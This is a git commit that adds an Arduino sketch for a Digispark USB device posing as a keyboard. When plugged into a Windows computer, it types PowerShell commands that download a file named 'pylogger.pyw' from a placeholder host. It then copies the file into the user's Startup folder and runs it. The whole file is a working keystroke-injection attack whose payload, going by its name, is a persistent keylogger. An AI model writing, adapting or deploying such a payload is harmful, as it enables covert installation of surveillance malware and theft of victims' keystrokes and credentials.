1e4f66372aa9c241fd4b740c17a191c7fe264895
Bora HIDIR <csehofficial@protonmail.com>
2022-01-12 18:49:15 +0300

    Add files via upload

---
+++ keylogusb.ino
@@ -0,0 +1,33 @@
+#define kbd_tr_tr
+#include "DigiKeyboard.h"
+void setup() {
+}
+void loop() {
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("Start-BitsTransfer http://[host-ip]/uploads/pylogger.pyw pylogger.pyw");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("cp pylogger.pyw './AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'");
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Start-Process pylogger.pyw");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  for (;;) {
+    /*Stops the digispark from running the scipt again*/
+  }
+}
